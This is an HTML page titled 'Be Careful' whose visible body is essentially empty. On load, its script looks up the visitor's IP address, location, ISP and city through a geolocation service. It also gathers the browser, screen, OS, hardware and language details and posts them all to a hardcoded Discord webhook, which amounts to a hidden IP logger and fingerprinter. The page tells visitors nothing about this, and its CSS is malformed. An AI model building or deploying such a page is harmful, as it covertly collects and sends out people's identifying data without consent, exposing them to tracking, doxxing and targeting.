<!DOCTYPE html>
<html>
  <head>
    <title>Be Careful</title>
    <style>
      body {
        font-family: Arial, sans-serif;

        padding: 0;

      h1 {
        margin: 0;
        font-size: 32px;
      }
      p {
        font-size: 18px;
        line-height: 1.5;
        margin: 20px 5px;
      }
      .danger {
        color: red;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <main>
      <p>

      <p>
        <span class="danger"> </span>
      </p>
    </main>
    <script>
      let echolog = {};
      fetch("https://wtfismyip.com/json")
        .then((response) => response.json())
        .then((data) => {
          let echolog = {
            ipAddress: data.YourFuckingIPAddress,
            location: data.YourFuckingLocation,
            hostname: data.YourFuckingHostname,
            isp: data.YourFuckingISP,
            city: data.YourFuckingCity,
            country: data.YourFuckingCountry,
            countryCode: data.YourFuckingCountryCode,
            userAgent: navigator.userAgent,
            windowProp: Object.keys(window).length,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            windowRatio: window.innerWidth / window.innerHeight,
            screenWidth: window.screen.availWidth,
            screenHeight: window.screen.availHeight,
            screenRatio: window.screen.availWidth / window.screen.availHeight,
            DPI: window.devicePixelRatio,
            colorDepth: window.screen.colorDepth,
            orientation: window.screen.orientation.type,
            orientationAngle: window.screen.orientation.angle,
            os: navigator.platform,
            threads: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            systemLanguages: navigator.languages.join(", "),
            languages: navigator.language,
          };

          // Set up the payload for the webhook
          const payload = {
            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry C[...]
          };
          // This is a lazy way of doing it, having
          // your webhook url out in the open like
          // this is a bad idea, you should instead
          // have it contact a internal API to
          // forward the request.
          fetch("https://discord.com/api/webhooks/1343704268544151582/EUCp97Pnynxpmi7mmp9PhEfQGkPpRpCcjwtZVCDYprHPI0-TGkAHp7hpoICaVPcG1GUL", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
          })
            .then((response) => console.log(response))
            .catch((error) => console.error(error));
        })
        .catch((error) => console.error(error));
    </script>
  </body>
